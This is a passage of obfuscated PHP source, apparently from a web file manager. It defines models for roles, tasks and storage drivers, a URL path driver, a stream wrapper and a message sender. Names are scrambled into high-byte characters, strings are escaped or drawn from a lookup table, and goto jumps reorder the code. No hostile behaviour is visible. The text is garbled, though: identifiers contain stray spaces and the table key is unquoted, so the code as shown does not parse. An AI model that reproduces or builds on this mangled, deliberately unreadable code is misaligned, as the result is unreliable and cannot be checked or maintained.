¨Ä®ñ]; if (!CacheLock::fileLock($áı“éÅ[13])) { return !1; } $Ğ‚ÇÔ¯Ë = parent::query($µüµ¯º); CacheLock::fileUnLock($áı“éÅ[13]); return $Ğ‚ÇÔ¯Ë; } public function execute($¾›ÍÙƒÖ) { $ò­ã í¨ =& $_SERVER[® ¨Ä®ñ]; if (!CacheLock::fileLock($ò­ã í¨[13])) { return !1; } $Ê–×¸í¢ = parent::execute($¾›ÍÙƒÖ); CacheLock::fileUnLock($ò­ã í¨[13]); return $Ê–×¸í¢; } } goto fºÍˆÏæÏ; cŒå‘¯ÒÁ: class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\x65\x6d\x2e\162\157\154\x65\x4c\x69\163\164"; public $field = array("\156\141\155\x65", "\x61\x75\x74\x68", "\154\x61\x62\x65\x6c", "\144\x69\x73\x70\x6c\x61\171", "\x73\171\163\164\x65\x6d", "\x64\x65\x73\x63", "\151\x67\156\x6f\x72\145\105\170\x74", "\151\x67\156\157\x72\145\106\x69\154\145\x53\151\x7a\x65", "\x61\144\155\151\156\x69\x73\x74\x72\x61\164\x6f\162", "\x73\x6f\x72\x74"); public function listData($£‘ãŒ•ï = false, $šøêĞÓ = "\163\157\162\164", $äßİ˜Íœ = false) { $ Ç«÷Ñ‹ =& $_SERVER[® ¨Ä®ñ]; $Âœú£âà = parent::listData($£‘ãŒ•ï, $šøêĞÓ, $äßİ˜Íœ); if (!$£‘ãŒ•ï) { foreach ($Âœú£âà as $°òÜôí¿ => $¶ö£Õãó) { if ($¶ö£Õãó[$ Ç«÷Ñ‹[2000]] == 1) { $Âœú£âà[$°òÜôí¿][$ Ç«÷Ñ‹[442]] = LNG($ Ç«÷Ñ‹[2226]); } } } return $Âœú£âà; } public function update($¨Èéƒˆğ, $‰ÜşßÒà) { $ŞŠÔÙ£ =& $_SERVER[® ¨Ä®ñ]; $‰°İï¿¥ = parent::listData($¨Èéƒˆğ); $†©ôåôÚ = $this->findByName($‰ÜşßÒà[$ŞŠÔÙ£[32]]); if (!$‰°İï¿¥ || $†©ôåôÚ && $†©ôåôÚ[$ŞŠÔÙ£[392]] != $‰°İï¿¥[$ŞŠÔÙ£[392]]) { return !1; } if ($†©ôåôÚ[$ŞŠÔÙ£[2000]] == 1) { $‰ÜşßÒà = array($ŞŠÔÙ£[32] => $‰ÜşßÒà[$ŞŠÔÙ£[32]], $ŞŠÔÙ£[1829] => $‰ÜşßÒà[$ŞŠÔÙ£[1829]]); } $this->filterAuth($‰ÜşßÒà[$ŞŠÔÙ£[405]]); return parent::update($¨Èéƒˆğ, $‰ÜşßÒà); } public function remove($®ß¤¶¥š) { $Í±›Ï¹‹ = parent::listData($®ß¤¶¥š); if (!$Í±›Ï¹‹ || $Í±›Ï¹‹[$_SERVER[® ¨Ä®ñ][1258]]) { return !1; } return parent::remove($®ß¤¶¥š); } public function add($³à×¢šû) { $İ±‘şì† =& $_SERVER[® ¨Ä®ñ]; $ö“³ÂÀ = $³à×¢šû[$İ±‘şì†[32]]; if ($this->findByName($ö“³ÂÀ)) { return !1; } $ÙÚê±‡ = array($İ±‘şì†[412] => $ö“³ÂÀ, $İ±‘şì†[1813] => $İ±‘şì†[12], $İ±‘şì†[1809] => $İ±‘şì†[1817], $İ±‘şì†[2227] => 1, $İ±‘şì†[1812] => 0, $İ±‘şì†[2228] => 0, $İ±‘şì†[1811] => $this->getSort()); $³à×¢šû = array_merge($ÙÚê±‡, $³à×¢šû); $this->filterAuth($³à×¢šû[$İ±‘şì†[405]]); return parent::insert($³à×¢šû); } private function getSort() { $‰®õá’§ =& $_SERVER[® ¨Ä®ñ]; $ãŠûé‘¼ = parent::listData(); $Ÿ˜Ò¸¡» = array_to_keyvalue($ãŠûé‘¼, $‰®õá’§[12], $‰®õá’§[1830]); return empty($Ÿ˜Ò¸¡») ? 0 : max($Ÿ˜Ò¸¡») + 1; } private function filterAuth(&$Å’ê”™š) { $†›ÆÉğ =& $_SERVER[® ¨Ä®ñ]; $¨†¶àÏ” = array(); $â÷ûÛÁ» = array_filter(explode($†›ÆÉğ[50], $Å’ê”™š)); foreach ($â÷ûÛÁ» as $Å’ê”™š) { $ş—¿¡¢¬ = explode($†›ÆÉğ[10], $Å’ê”™š); if ($ş—¿¡¢¬[0] == $†›ÆÉğ[2229] && $ş—¿¡¢¬[1] != $†›ÆÉğ[1177]) { $·µÙ¼’¡ = $ş—¿¡¢¬[0] . $†›ÆÉğ[10] . $ş—¿¡¢¬[1] . $†›ÆÉğ[2230]; if (!in_array($·µÙ¼’¡, $â÷ûÛÁ»)) { $¨†¶àÏ”[] = $·µÙ¼’¡; } } $¨†¶àÏ”[] = $Å’ê”™š; } $Å’ê”™š = implode($†›ÆÉğ[50], $¨†¶àÏ”); } public function sort($Çô¦–Çå, $›ıšğ™ã) { return parent::update($Çô¦–Çå, $›ıšğ™ã); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\x65\155\56\164\141\163\x6b\114\151\x73\164"; public $field = array("\156\141\x6d\145", "\x74\171\x70\x65", "\x65\x76\x65\x6e\x74", "\164\151\155\x65", "\x64\145\163\x63", "\x73\x79\163\164\x65\x6d", "\145\156\x61\x62\154\145", "\x6c\141\163\x74\122\165\x6e", "\x73\157\162\x74"); public function listData($ü‡ÅÁó = false, $ÀÅ„Ã–ã = "\x73\157\x72\x74", $£êñô…¤ = false) { return parent::listData($ü‡ÅÁó, $ÀÅ„Ã–ã, $£êñô…¤); } public function add($€¡æâ») { $öäëªƒì =& $_SERVER[® ¨Ä®ñ]; $şÂøÇØ = $this->findByName($€¡æâ»[$öäëªƒì[32]]); if ($şÂøÇØ) { return !1; } $€¡æâ»[$öäëªƒì[1600]] = 0; $€¡æâ»[$öäëªƒì[1830]] = $this->getSort(); return parent::insert($€¡æâ»); } private function getSort() { $ÅĞ® ¸Í =& $_SERVER[® ¨Ä®ñ]; $Øš×€›„ = parent::listData(); $ËîÃÁË = array_to_keyvalue($Øš×€›„, $ÅĞ® ¸Í[12], $ÅĞ® ¸Í[1830]); return empty($ËîÃÁË) ? 0 : max($ËîÃÁË) + 1; } public function update($»Ûœ‘Ÿë, $³œˆç±Ó) { $‰íøÒ·° =& $_SERVER[® ¨Ä®ñ]; $³¦µ¥ì = $this->listData($»Ûœ‘Ÿë); $‰È›ÒæÙ = $this->findByName($³œˆç±Ó[$‰íøÒ·°[32]]); if (!$³¦µ¥ì || $‰È›ÒæÙ && $‰È›ÒæÙ[$‰íøÒ·°[392]] != $³¦µ¥ì[$‰íøÒ·°[392]]) { return !1; } return parent::update($»Ûœ‘Ÿë, $³œˆç±Ó); } public function remove($©¾–‰¶¦, $û…ÙÆ±³ = false) { $Ëñî˜·¨ =& $_SERVER[® ¨Ä®ñ]; $ğÈæì­ = $this->listData($©¾–‰¶¦); if (!$ğÈæì­) { return; } if (!$û…ÙÆ±³ && $ğÈæì­[$Ëñî˜·¨[1258]] == $Ëñî˜·¨[89]) { return !1; } return parent::remove($©¾–‰¶¦); } public function enable($şí ”ùÙ, $ñüîÎà) { return $this->update($şí ”ùÙ, array($_SERVER[® ¨Ä®ñ][2221] => $ñüîÎà)); } public function run($Íç£¬²ô) { return $this->update($Íç£¬²ô, array($_SERVER[® ¨Ä®ñ][2231] => time())); } } goto cÃĞÈ¹İÈÁ; d²»ÆÅæÈë: class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($»™ŒñĞ = false) { } public function exist($»ªş¦í½) { $’­¢ÜÅÑ = $this->info($»ªş¦í½); return $’­¢ÜÅÑ[$_SERVER[® ¨Ä®ñ][194]]; } public function isFile($ÅäğÇ„£) { $–¬§šàÚ = $this->info($ÅäğÇ„£); return $–¬§šàÚ[$_SERVER[® ¨Ä®ñ][194]]; } public function isFolder($‘‚œŞßÓ) { return !1; } public function size($øÌÄµ¶Û) { $ôÏãéÍÛ = $this->info($øÌÄµ¶Û); return $ôÏãéÍÛ[$_SERVER[® ¨Ä®ñ][80]]; } public function info($…ÃÚ‹õÁ) { return $this->infoParse($…ÃÚ‹õÁ); } public function infoAuth($”·¿„“) { return $this->infoParse($”·¿„“); } public function infoWithChildren($ÖÔ¯ªÔ·) { return $this->infoParse($ÖÔ¯ªÔ·); } public function infoFull($èÂÔàÀ) { return $this->infoParse($èÂÔàÀ); } private function infoParse($ãÉÇ†¬—) { $üÊæÅ“û =& $_SERVER[® ¨Ä®ñ]; $¸éå¨Ã™ = $this->header($ãÉÇ†¬—); if (!$¸éå¨Ã™ || !$¸éå¨Ã™[$üÊæÅ“û[732]]) { return !1; } $»ºÉÁ ‹ = _get($¸éå¨Ã™, $üÊæÅ“û[332], 0); $ç³ùª¬Ÿ = array($üÊæÅ“û[32] => $¸éå¨Ã™[$üÊæÅ“û[32]], $üÊæÅ“û[78] => $ãÉÇ†¬—, $üÊæÅ“û[33] => $üÊæÅ“û[192], $üÊæÅ“û[80] => intval($»ºÉÁ ‹), $üÊæÅ“û[167] => get_path_ext($¸éå¨Ã™[$üÊæÅ“û[32]]), $üÊæÅ“û[1360] => $»ºÉÁ ‹ > 0 && $¸éå¨Ã™[$üÊæÅ“û[1482]], $üÊæÅ“û[1361] => !1); return $ç³ùª¬Ÿ; } private function header($Æ‚ñàÜ ) { $öòéòöÄ =& $_SERVER[® ¨Ä®ñ]; if (isset(self::$_cacheHeader[$Æ‚ñàÜ ])) { return self::$_cacheHeader[$Æ‚ñàÜ ]; } $ë¡Ÿåúš = isset($GLOBALS[$öòéòöÄ[1483]]) ? $GLOBALS[$öòéòöÄ[1483]] : !1; $GLOBALS[$öòéòöÄ[1483]] = !0; self::$_cacheHeader[$Æ‚ñàÜ ] = url_header($Æ‚ñàÜ ); $GLOBALS[$öòéòöÄ[1483]] = $ë¡Ÿåúš; return self::$_cacheHeader[$Æ‚ñàÜ ]; } public function hashSimple($ŞÌœâ²ô, $½¼î¹âæ = false) { $´½²€¤« =& $_SERVER[® ¨Ä®ñ]; $ñ„£ÇºÊ = $this->info($ŞÌœâ²ô); if (!$ñ„£ÇºÊ || !$ñ„£ÇºÊ[$´½²€¤«[194]]) { return !1; } $úÁì‹Ë = $ñ„£ÇºÊ[$´½²€¤«[80]]; $‚¸²™Â‹ = 200; $ÁÛ»¨ÎÆ = 50; if ($úÁì‹Ë <= $‚¸²™Â‹ * $ÁÛ»¨ÎÆ) { return md5($this->fileSubstr($ŞÌœâ²ô, 0, $úÁì‹Ë)) . $úÁì‹Ë; } $µ÷è””— = intval($úÁì‹Ë / $ÁÛ»¨ÎÆ); $…Òæİ¿À = $´½²€¤«[12]; $˜¡Ÿ = timeFloat(); $³Ÿ ú†Ö = 15; for ($şƒ…§Ú— = 0; $şƒ…§Ú— < $ÁÛ»¨ÎÆ; $şƒ…§Ú—++) { if (timeFloat() - $˜¡Ÿ > $³Ÿ ú†Ö) { return !1; } $ÔÅ¶êûß = $this->fileSubstr($ŞÌœâ²ô, $µ÷è””— * $şƒ…§Ú—, $‚¸²™Â‹); if (!$ÔÅ¶êûß) { return !1; } $…Òæİ¿À .= $ÔÅ¶êûß; } $…Òæİ¿À .= $this->fileSubstr($ŞÌœâ²ô, $úÁì‹Ë - $‚¸²™Â‹, $‚¸²™Â‹); return md5($…Òæİ¿À) . $úÁì‹Ë; } public function getContent($§¸°âİ‰) { return $this->fileSubstr($§¸°âİ‰); } public function fileSubstr($»­°»¯ù, $ÛÚÜÊÃ‚ = 0, $¯”Ùòô’ = -1) { $ïãûšÆ’ =& $_SERVER[® ¨Ä®ñ]; $¾Å¿ÄÜå = $this->info($»­°»¯ù); if (!$¾Å¿ÄÜå || !$¾Å¿ÄÜå[$ïãûšÆ’[194]] && $¾Å¿ÄÜå[$ïãûšÆ’[80]] > 1024 * 1024 * 10) { return !1; } if ($¯”Ùòô’ === -1) { $¯”Ùòô’ = $¾Å¿ÄÜå[$ïãûšÆ’[80]]; } if ($¯”Ùòô’ == 0) { return $ïãûšÆ’[12]; } $½ïÓ—å = array($ïãûšÆ’[1484] . $ÛÚÜÊÃ‚ . $ïãûšÆ’[764] . ($ÛÚÜÊÃ‚ + $¯”Ùòô’ - 1)); $ÔßæËßÁ = url_request($»­°»¯ù, $ïãûšÆ’[225], !1, $½ïÓ—å, !1, !1, 1); return $ÔßæËßÁ[$ïãûšÆ’[1175]] ? $ÔßæËßÁ[$ïãûšÆ’[1175]] : $ïãûšÆ’[12]; } public function download($¹‘°¦Œñ, $ˆ°•Ã¸) { Downloader::start($¹‘°¦Œñ, $ˆ°•Ã¸); return $ˆ°•Ã¸; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($¾àµ“ş, $¿ØüÏ¬¦ = '') { $this->info = $this->info($¾àµ“ş); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[® ¨Ä®ñ][78]]; $this->pathOpen = $¾àµ“ş; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$¾àµ“ş])) { self::$_chunkBuffer[$¾àµ“ş] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($®—¹õ«Ä) { $ñ×Ì”Í = $this->fileSubstr($this->pose, $®—¹õ«Ä); $this->pose += strlen($ñ×Ì”Í); return $ñ×Ì”Í; } public function stream_tell() { return $this->pose; } public function stream_seek($ú¿¢ş¸, $ëä¤ÏÍ) { $Õü®›¸· =& $_SERVER[® ¨Ä®ñ]; if ($ëä¤ÏÍ == SEEK_SET) { $this->pose = $ú¿¢ş¸; } else { if ($ëä¤ÏÍ == SEEK_CUR) { $this->pose += $ú¿¢ş¸; } else { if ($ëä¤ÏÍ == SEEK_END) { $this->pose = $this->info[$Õü®›¸·[80]] + intval($ú¿¢ş¸); } } } if ($ú¿¢ş¸ < 0) { $this->pose = $this->info[$Õü®›¸·[80]] + $ú¿¢ş¸; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[® ¨Ä®ñ][80]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($…‹ƒñ¦Ş, $ˆ©Ï¡Çé) { $ì«Ìı–ä =& $_SERVER[® ¨Ä®ñ]; $ÖÉÖ½‰ = $this->info($…‹ƒñ¦Ş); return array($ì«Ìı–ä[1485] => 0, $ì«Ìı–ä[1486] => 0, $ì«Ìı–ä[16] => 32768 + 511, $ì«Ìı–ä[1487] => 0, $ì«Ìı–ä[1488] => 0, $ì«Ìı–ä[1489] => 0, $ì«Ìı–ä[1490] => 0, $ì«Ìı–ä[80] => $ÖÉÖ½‰[$ì«Ìı–ä[80]], $ì«Ìı–ä[1491] => $ÖÉÖ½‰[$ì«Ìı–ä[1359]], $ì«Ìı–ä[1447] => $ÖÉÖ½‰[$ì«Ìı–ä[86]], $ì«Ìı–ä[1446] => $ÖÉÖ½‰[$ì«Ìı–ä[193]], $ì«Ìı–ä[1492] => 0, $ì«Ìı–ä[1493] => 0); } static $fileInfo = array(); public function info($Ã­Î“šÍ) { $—ŸÕÊÂÇ = $_SERVER[® ¨Ä®ñ][1494]; if (isset(self::$fileInfo[$Ã­Î“šÍ])) { return self::$fileInfo[$Ã­Î“šÍ]; } if (substr($Ã­Î“šÍ, 0, strlen($—ŸÕÊÂÇ)) != $—ŸÕÊÂÇ) { return !1; } self::$fileInfo[$Ã­Î“šÍ] = IO::info(substr($Ã­Î“šÍ, strlen($—ŸÕÊÂÇ))); return self::$fileInfo[$Ã­Î“šÍ]; } public static function read($ºîøØ“¼, $Í®ÜŒº­, $é¨üÑ¡£) { if (!isset(self::$_fopenCache[$ºîøØ“¼])) { $ÊÎÕĞÍ¯ = new StreamWrapperIO(); $ÊÎÕĞÍ¯->stream_open($ºîøØ“¼); self::$_fopenCache[$ºîøØ“¼] = $ÊÎÕĞÍ¯; } $ÊÎÕĞÍ¯ = self::$_fopenCache[$ºîøØ“¼]; return $ÊÎÕĞÍ¯->fileSubstr($Í®ÜŒº­, $é¨üÑ¡£); } public static function _read($¤’È¼•ß, $…¼­¨Î, $’Îå“ìï) { $ûŒï†Şø =& $_SERVER[® ¨Ä®ñ]; $­ğĞº´¡ = fopen($¤’È¼•ß, $ûŒï†Şø[1363]); if (!$­ğĞº´¡) { return $ûŒï†Şø[12]; } $°–ğŸ²– = 8192; fseek($­ğĞº´¡, $…¼­¨Î, SEEK_SET); $ò¤ßÃÅË = $ûŒï†Şø[12]; $Œ“ÇÉû = 0; while ($Œ“ÇÉû < $’Îå“ìï) { $¨³€îóõ = min($°–ğŸ²–, $’Îå“ìï - $Œ“ÇÉû); $ò¤ßÃÅË .= fread($­ğĞº´¡, $¨³€îóõ); $Œ“ÇÉû += $¨³€îóõ; } fclose($­ğĞº´¡); return $ò¤ßÃÅË; } public function fileSubstr($è¸ıñ º, $¦à‡ä¼İ) { $½û„•ùÙ =& $_SERVER[® ¨Ä®ñ]; $–Ü³ƒÔè = $this->info[$½û„•ùÙ[80]]; $’Â»×Ü» = $è¸ıñ º; $­¦²¾ø· = $¦à‡ä¼İ; if ($è¸ıñ º < 0) { $è¸ıñ º = $–Ü³ƒÔè + $è¸ıñ º; } if ($¦à‡ä¼İ === !1) { $¦à‡ä¼İ = $–Ü³ƒÔè - $è¸ıñ º; } if ($è¸ıñ º + $¦à‡ä¼İ > $–Ü³ƒÔè) { $¦à‡ä¼İ = $–Ü³ƒÔè - $è¸ıñ º; } if ($¦à‡ä¼İ <= 0) { return $½û„•ùÙ[12]; } if ($è¸ıñ º < 0 || $è¸ıñ º >= $–Ü³ƒÔè || $¦à‡ä¼İ <= 0 || $¦à‡ä¼İ > 1024 * 1024 * 10) { throw new Exception("\x69\157\106\151\x6c\x65\122\x65\141\x64\x20\x65\x72\x72\157\x72\x21\x20\x73\x74\141\x72\164\75{$è¸ıñ º}\x3b\154\145\156\147\x74\x68\x3d{$¦à‡ä¼İ}\73\x20\x73\151\x7a\x65\75{$–Ü³ƒÔè}\x3b"); } $æÈÍÖ° = 64 * 1024; $·£µ‚æÆ =& self::$_chunkBuffer[$this->path]; if (!$·£µ‚æÆ) { $·£µ‚æÆ = array(); } $ÍâËıå = 0; $¡‰ªå· = 0; $ÕÎ¼“×„ = $½û„•ùÙ[12]; foreach ($·£µ‚æÆ as $ÍâËıå => $ÕÎ¼“×„) { $ÍâËıå = intval($ÍâËıå); $¡‰ªå· = $ÍâËıå + strlen($ÕÎ¼“×„); if ($è¸ıñ º >= $¡‰ªå·) { continue; } if ($è¸ıñ º >= $ÍâËıå && $è¸ıñ º + $¦à‡ä¼İ <= $¡‰ªå·) { return substr($ÕÎ¼“×„, $è¸ıñ º - $ÍâËıå, $¦à‡ä¼İ); } break; } if (count($·£µ‚æÆ) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($½û„•ùÙ[1495], $½û„•ùÙ[1496] . count($·£µ‚æÆ) . "\73\x73\x74\x61\162\164\x3d{$è¸ıñ º}\54\154\145\x6e\147\164\x68\75{$¦à‡ä¼İ}\x3b\x70\157\x73\145\72{$ÍâËıå}\x7e{$¡‰ªå·}"); throw new Exception($½û„•ùÙ[1497]); } $§ÉÍáŠ… = intval($è¸ıñ º / $æÈÍÖ°) * $æÈÍÖ°; $š¹¤…»˜ = ceil(($è¸ıñ º + $¦à‡ä¼İ) / $æÈÍÖ°) * $æÈÍÖ° - $§ÉÍáŠ…; $·“×È‚† = IO::fileSubstr($this->path, $§ÉÍáŠ…, $š¹¤…»˜); $·£µ‚æÆ[$§ÉÍáŠ… . $½û„•ùÙ[12]] = $·“×È‚†; ksort($·£µ‚æÆ); $†¢¡­ª = substr($·“×È‚†, $è¸ıñ º - $§ÉÍáŠ…, $¦à‡ä¼İ); return $†¢¡­ª; } private function log($áø„õò¹, $‡¼†¿ñ») { $‹ ¾¢ğœ =& $_SERVER[® ¨Ä®ñ]; $ÛË´‚éï = timeFloat() - $this->timeStart; write_log(sprintf($‹ ¾¢ğœ[1498], $áø„õò¹, $this->info[$‹ ¾¢ğœ[32]], $ÛË´‚éï, $‡¼†¿ñ»), $‹ ¾¢ğœ[1165]); } } class Message { function __construct() { } public function send($¶İú²‡Û = '', $ØŒÚƒËØ = array(), $ıˆ—öğ” = "\x74\x65\x78\164") { $ºüüçºˆ =& $_SERVER[® ¨Ä®ñ]; $ªˆ¯šœí = array($ºüüçºˆ[33] => $ºüüçºˆ[1499], $ºüüçºˆ[737] => $¶İú²‡Û); if (in_array($ıˆ—öğ”, array($ºüüçºˆ[1499], $ºüüçºˆ[1500]))) { $ªˆ¯šœí[$ºüüçºˆ[33]] = $ıˆ—öğ”; } $ØŒÚƒËØ = array($ºüüçºˆ[506] => isset($ØŒÚƒËØ[$ºüüçºˆ[506]]) ? $ØŒÚƒËØ[$ºüüçºˆ[506]] : $ºüüçºˆ[12], $ºüüçºˆ[585] => isset($ØŒÚƒËØ[$ºüüçºˆ[585]]) ? $ØŒÚƒËØ[$ºüüçºˆ[585]] : $ºüüçºˆ[12]); if (empty($¶İú²‡Û) || empty($ØŒÚƒËØ[$ºüüçºˆ[506]]) && empty($ØŒÚƒËØ[$ºüüçºˆ[585]])) { return !1; } $íÖŞÃô‹ = array($ºüüçºˆ[1440] => $ªˆ¯šœí, $ºüüçºˆ[1501] => $ØŒÚƒËØ); Hook::trigger($ºüüçºˆ[1502], $íÖŞÃô‹); } } goto cíô‚°¨Å½; d²îŞ¨¾ÊŠ: class SourceSecretModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\145\x6d\x2e\163\157\x75\x72\143\145\123\145\143\x72\x65\164\114\x69\163\164"; public $field = array("\x73\157\165\162\143\145\111\x44", "\x74\171\x70\x65\x49\104", "\x63\162\x65\141\x74\145\x55\x73\x65\162"); } class StorageModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\x65\x6d\x2e\x73\164\x6f\x72\x61\x67\145\x4c\x69\x73\164"; public $field = array("\x6e\x61\x6d\x65", "\163\151\x7a\x65\115\x61\170", "\x73\x79\x73\164\145\155", "\x64\145\x66\141\x75\x6c\164", "\x64\162\x69\x76\x65\x72", "\143\x6f\156\x66\151\147"); public function listData($èş¹„Ò = false, $¬ŠÍÓÎş = "\155\157\144\x69\146\171\124\x69\155\x65", $åÜÕš¤ = false) { $‹£ÖˆÓ =& $_SERVER[® ¨Ä®ñ]; $ş¼Ü«Ÿ» = parent::listData($èş¹„Ò, $¬ŠÍÓÎş, $åÜÕš¤); if ($èş¹„Ò) { return $ş¼Ü«Ÿ»; } $©Œ¬À¯Ì = $this->ioSizeUseGet(array_to_keyvalue($ş¼Ü«Ÿ», $‹£ÖˆÓ[12], $‹£ÖˆÓ[392])); foreach ($ş¼Ü«Ÿ» as $€á¹ã§ö => $¤ı°µ¿½) { unset($ş¼Ü«Ÿ»[$€á¹ã§ö][$‹£ÖˆÓ[6]]); $ş¼Ü«Ÿ»[$€á¹ã§ö][$‹£ÖˆÓ[1796]] = isset($©Œ¬À¯Ì[$¤ı°µ¿½[$‹£ÖˆÓ[392]]]) ? $©Œ¬À¯Ì[$¤ı°µ¿½[$‹£ÖˆÓ[392]]] : 0; } return $ş¼Ü«Ÿ»; } public function ioSizeUseGet($˜ëöÓ“­) { $ïñ°Ê˜Û =& $_SERVER[® ¨Ä®ñ]; if (!$˜ëöÓ“­) { return array(); } $èÎÏûßä = $ïñ°Ê˜Û[2110] . implode($ïñ°Ê˜Û[50], $˜ëöÓ“­); $êÓò†ú€ = Cache::get($èÎÏûßä); if ($êÓò†ú€) { return $êÓò†ú€; } $öñ¶áª— = array($ïñ°Ê˜Û[799] => $ïñ°Ê˜Û[392], $ïñ°Ê˜Û[2111] => $ïñ°Ê˜Û[80]); $ÊèŒ«‘© = array($ïñ°Ê˜Û[799] => array($ïñ°Ê˜Û[7], $˜ëöÓ“­)); $êÓò†ú€ = Model($ïñ°Ê˜Û[771])->field($öñ¶áª—)->where($ÊèŒ«‘©)->group($ïñ°Ê˜Û[799])->select(); $êÓò†ú€ = array_to_keyvalue($êÓò†ú€, $ïñ°Ê˜Û[392], $ïñ°Ê˜Û[80]); Cache::set($èÎÏûßä, $êÓò†ú€, 600); return $êÓò†ú€; } public function getConfig($ù¶’Á¡) { $Û™Ñ£Ğ‹ = parent::listData($ù¶’Á¡); return json_decode($Û™Ñ£Ğ‹[$_SERVER[® ¨Ä®ñ][6]], !0); } public function update($âşõÀÄë, $éõï×®’) { $Ó¯½¦ö® =& $_SERVER[® ¨Ä®ñ]; $Ç«Š ¶Ø = $éõï×®’[$Ó¯½¦ö®[32]]; $€àÎ¼ñí = array_to_keyvalue(parent::listData(), $Ó¯½¦ö®[32]); if (isset($€àÎ¼ñí[$Ç«Š ¶Ø]) && $€àÎ¼ñí[$Ç«Š ¶Ø][$Ó¯½¦ö®[392]] != $âşõÀÄë) { return !1; } if (isset($éõï×®’[$Ó¯½¦ö®[2112]]) && $éõï×®’[$Ó¯½¦ö®[2112]] == $Ó¯½¦ö®[89]) { $this->checkConfig($éõï×®’); } unset($éõï×®’[$Ó¯½¦ö®[2112]]); $ø†áœ = parent::update($âşõÀÄë, $éõï×®’); if ($ø†áœ && $éõï×®’[$Ó¯½¦ö®[37]]) { foreach ($€àÎ¼ñí as $™Á£¤Íè) { if ($™Á£¤Íè[$Ó¯½¦ö®[37]] && $™Á£¤Íè[$Ó¯½¦ö®[392]] != $âşõÀÄë) { parent::update($™Á£¤Íè[$Ó¯½¦ö®[392]], array($Ó¯½¦ö®[37] => 0)); } } } return $ø†áœ; } public function add($“¯œ°×š) { $®ôÂ»¾’ =& $_SERVER[® ¨Ä®ñ]; $¢–¾“ı¡ = array_to_keyvalue(parent::listData(), $®ôÂ»¾’[32]); if (isset($¢–¾“ı¡[$“¯œ°×š[$®ôÂ»¾’[32]]])) { return !1; } $this->checkConfig($“¯œ°×š); $…Ø¥’“ = parent::insert($“¯œ°×š); if ($…Ø¥’“ && $“¯œ°×š[$®ôÂ»¾’[37]]) { foreach ($¢–¾“ı¡ as $ıı’’»•) { if ($ıı’’»•[$®ôÂ»¾’[37]]) { parent::update($ıı’’»•[$®ôÂ»¾’[392]], array($®ôÂ»¾’[37] => 0)); } } } return $…Ø¥’“; } public function checkConfig(&$Ÿô™ŒË±, $åŠ¶Õ¡ = false) { $÷÷‡½Ä€ =& $_SERVER[® ¨Ä®ñ]; $‹‡§¦ = strtolower($Ÿô™ŒË±[$÷÷‡½Ä€[96]]); $Ù÷á¤˜ª = json_decode($Ÿô™ŒË±[$÷÷‡½Ä€[6]], !0); foreach ($Ù÷á¤˜ª as $³“ïÎ• => $¶¥»‰ôø) { $Ù÷á¤˜ª[$³“ïÎ•] = trim($¶¥»‰ôø); } $Ù÷á¤˜ª[$÷÷‡½Ä€[2113]] = rand_string(6); $ôÍÅêÂş = $GLOBALS[$÷÷‡½Ä€[6]][$÷÷‡½Ä€[90]][$÷÷‡½Ä€[808]]; $…ğö¯€Ó = isset($ôÍÅêÂş[$‹‡§¦]) ? $ôÍÅêÂş[$‹‡§¦] : ucfirst($‹‡§¦); $àá²Ğ¸© = $÷÷‡½Ä€[74] . $…ğö¯€Ó; if (!$…ğö¯€Ó || !class_exists($àá²Ğ¸©)) { if ($åŠ¶Õ¡) { return LNG($÷÷‡½Ä€[2114]); } write_log(array($÷÷‡½Ä€[2115], $Ÿô™ŒË±, get_caller_info()), $÷÷‡½Ä€[2116]); show_json(LNG($÷÷‡½Ä€[2114]), !1, $Ÿô™ŒË±); } $úá§¶„œ = new $àá²Ğ¸©($Ù÷á¤˜ª); if (in_array($‹‡§¦, $úá§¶„œ->objectDriver)) { if (!$úá§¶„œ->isBucketCors() && !$úá§¶„œ->setBucketCors()) { $şàšÇîÃ = LNG($÷÷‡½Ä€[2117]); $şàšÇîÃ .= $÷÷‡½Ä€[2118] . LNG($÷÷‡½Ä€[2119]); if ($åŠ¶Õ¡) { return $şàšÇîÃ; } show_json($şàšÇîÃ, !1); } } $Ÿ‘ÂÌïò = rtrim($Ù÷á¤˜ª[$÷÷‡½Ä€[1163]], $÷÷‡½Ä€[8]) . $÷÷‡½Ä€[8]; $°Ô¨‡‚˜ = $úá§¶„œ->getPath($Ÿ‘ÂÌïò . $÷÷‡½Ä€[1225]); if (!$úá§¶„œ->mkfile($°Ô¨‡‚˜)) { if ($åŠ¶Õ¡) { return LNG($÷÷‡½Ä€[2117]); } show_json(LNG($÷÷‡½Ä€[2117]), !1); } $Ù÷á¤˜ª[$÷÷‡½Ä€[1163]] = $Ÿ‘ÂÌïò; $Ÿô™ŒË±[$÷÷‡½Ä€[6]] = json_encode($Ù÷á¤˜ª); $Ÿô™ŒË±[$÷÷‡½Ä€[96]] = $…ğö¯€Ó; return !0; } public function driverListSystem() { $¯èĞö£’ =& $_SERVER[® ¨Ä®ñ]; $íÆ–úë© = parent::listData(); $ÇÎİÖùæ = array(); foreach ($íÆ–úë© as $¶­ï¦Öª) { unset($¶­ï¦Öª[$¯èĞö£’[193]], $¶­ï¦Öª[$¯èĞö£’[86]]); $¶­ï¦Öª[$¯èĞö£’[6]] = json_decode($¶­ï¦Öª[$¯èĞö£’[6]], !0); $ÇÎİÖùæ[] = $¶­ï¦Öª; } return $ÇÎİÖùæ; } public function defaultDriver() { $ìªœ îæ =& $_SERVER[® ¨Ä®ñ]; $…Ş™éä = parent::listData(); $×ö½Û„ˆ = array_filter_by_field($…Ş™éä, $ìªœ îæ[37], 1); $×ö½Û„ˆ = $×ö½Û„ˆ[0]; if ($×ö½Û„ˆ) { $×ö½Û„ˆ[$ìªœ îæ[6]] = 